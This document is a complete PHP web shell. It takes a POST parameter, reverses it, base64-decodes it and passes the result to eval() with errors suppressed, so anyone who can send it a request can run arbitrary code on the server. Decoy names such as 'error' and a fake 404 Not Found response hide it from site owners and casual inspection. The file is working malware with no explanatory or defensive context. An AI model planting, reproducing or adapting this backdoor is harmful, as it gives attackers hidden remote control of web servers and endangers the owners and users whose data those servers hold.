<?php

class _
{
    static public $php = Null;
    function __construct($l = "error")
    {
        self::$php = $l;
        @eval(null . null . self::$php);
    }
}
$error = null . base64_decode(strrev(@$_POST["1"]));
$d = new _($error);
header('HTTP/1.1 404 Not Found');
